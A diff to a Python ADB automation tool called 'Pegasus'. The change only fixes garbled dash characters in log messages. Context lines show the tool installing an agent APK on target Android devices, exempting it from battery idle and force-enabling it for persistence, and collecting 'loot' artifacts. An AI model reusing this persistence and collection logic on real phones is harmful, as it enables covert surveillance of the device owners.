@@ -126,7 +126,7 @@ class Run:
                 continue
             serial = line.split()[0]
             if "unauthorized" in line:
-                self.log(f"unauthorized â€” accept the RSA prompt on {serial}")
+                self.log(f"unauthorized -- accept the RSA prompt on {serial}")
                 continue
             if "offline" in line:
                 continue
@@ -191,7 +191,7 @@ class Run:
             self.log(f"install rc={rc} {out.strip()[:160]}")
         else:
             self.session["installed"] = False
-            self.log("no APK â€” read-only ADB only")
+            self.log("no APK -- read-only ADB only")
 
     def listen(self) -> None:
         self.set(Phase.LISTEN)
@@ -265,7 +265,7 @@ class Run:
     def _persistence(self, serial, outdir, rules):
         pkg = self.opts.get("package") or "com.pegasus.agent"
         if not self.session.get("installed"):
-            (outdir / "persistence.txt").write_text("skipped â€” not installed\n")
+            (outdir / "persistence.txt").write_text("skipped -- not installed\n")
             return
         adb("shell", "cmd", "deviceidle", "whitelist", pkg, serial=serial)
         adb("shell", "pm", "enable", pkg, serial=serial)
@@ -318,7 +318,7 @@ class Run:
         self.set(Phase.NOTIFY)
         count = sum(len(list(p.iterdir())) for p in (self.dir / "loot").glob("*")
                     if p.is_dir()) if (self.dir / "loot").exists() else 0
-        notify("Pegasus â€” cycle complete",
+        notify("Pegasus -- cycle complete",
                f"{self.id}: {len(self.targets)} target(s), {count} artifact(s).")
         self.set(Phase.DECIDING)
         self.decided.wait(timeout=self.opts.get("decision_timeout", 3600))
@@ -395,7 +395,7 @@ def start(opts: dict) -> Run:
             run.log(f"FATAL: {exc}")
             run.set(Phase.FAILED)
             registry.unbind(run.id)
-            notify("Pegasus â€” cycle failed", str(exc))
+            notify("Pegasus -- cycle failed", str(exc))
 
     threading.Thread(target=worker, daemon=True).start()
     return run
